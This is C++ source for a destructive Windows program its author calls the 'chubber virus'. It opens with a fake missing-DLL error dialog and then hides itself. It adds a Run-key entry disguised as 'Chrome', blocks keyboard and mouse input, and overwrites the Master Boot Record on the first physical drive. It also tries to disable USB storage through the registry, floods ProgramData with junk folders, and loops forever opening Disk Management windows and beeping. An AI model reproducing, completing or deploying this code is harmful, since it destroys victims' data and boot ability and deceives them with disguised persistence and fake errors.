
/*

Copyright 2019 (c) Dashies Software Inc.

the chubber virus has been made because I was and still am
kind of experimenting with new technologies, I want to see
if I can compile this shitty thing with the required
libraries embeded within my app, this way people on any
operating system can run this beautiful app.

Lol, also, this Application may damage your CPU, as it will
over-thread your System. Virtual Machines will crash Instantly.


Features :
	- Overload (IV)
	- Confusion (I)
	- Porn Injection (III)
	- Master Boot Record (V)

Author : Dashie

*/


#include "pch.h"

#include<windows.h>
#include<wininet.h>
#include<stdlib.h>
#include<lmcons.h>
#include<string.h>
#include<stdio.h>

#include<iostream>
#include<sstream>
#include<fstream>

#include<string>
#include<thread>
#include<vector>


class Chubber {
public :
	void dashed()
	{
		for(int index = 0; index <= 32; index += 1)
			MessageBox(NULL, "You have been DASHED by DASHIE, HAH, enjoy it sweetheart <3", "Ponyshit", MB_OK | MB_ICONINFORMATION);
	}

	void dir_bust() 
	{
		SetCurrentDirectory("C:\\ProgramData\\");
		std::string patherium;
		srand(time(NULL));

		for (int index = 0; index <= 320; index += 1)
		{
			patherium = "C:\\ProgramData\\" + std::to_string(rand()%9999999) + "dashie." + std::to_string(rand() % 9999999);
			CreateDirectory(patherium.c_str(), NULL);
			std::ofstream exp(patherium.c_str());
		}
	}

	void cursor_bye()
	{
		HANDLE id = GetStdHandle(STD_OUTPUT_HANDLE);
		CONSOLE_CURSOR_INFO zeCursor;

		zeCursor.bVisible = false;
		zeCursor.dwSize = 20;

		SetConsoleCursorInfo(id, &zeCursor);
	}

	void corrupt_drive()
	{
		char bMasterBootRecord[512];

		DWORD dwBytesWritten = {0};
		HANDLE FileHandle;

		FileHandle = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		WriteFile(FileHandle, bMasterBootRecord, 512, &dwBytesWritten, NULL);
		CloseHandle(FileHandle);
	}
};

int main(int l, char ** c)
{
	MessageBox(NULL, "The program can not start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this program. You may also choose to try and run this application again to fix this issue.", "Runtime - System Error", MB_OK | MB_ICONSTOP);

	TCHAR buff[MAX_PATH];
	HKEY key = NULL;
	std::string fpath = buff;
	HWND id = GetConsoleWindow();

	Sleep(800000);
	ShowWindow(id, SW_HIDE);

	GetModuleFileName(NULL, buff, MAX_PATH);
	RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &key);
	RegSetValueEx(key, "Chrome", 0, REG_SZ, (BYTE *)fpath.c_str(), (fpath.size() + 1) * sizeof(wchar_t));

	BlockInput(true);

	SetConsoleTitle(TEXT("Dashed and Shit!"));

	std::thread dashed(&Chubber::dashed, Chubber());
	Sleep(3000);

	std::thread overwrite_drives(&Chubber::corrupt_drive, Chubber());
	std::thread cursor_bye(&Chubber::cursor_bye, Chubber());

	system("REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBTOR Vv Start Vt REG_DWORD Vd 4 Vf");

	cursor_bye.join();
	overwrite_drives.join();

	for(int index = 0; index <= 8; index += 1) 
		std::thread dir_dir(&Chubber::dir_bust, Chubber());

	for (;;) 
	{
		for (int index = 0; index <= 32; index += 1) ShellExecute(NULL, "open", "C:\\Windows\\System32\\diskmgmt.msc", NULL, NULL, SW_SHOW);

		std::cout << (char)7;
		Beep(420, 500);
	}

	return 0;
}
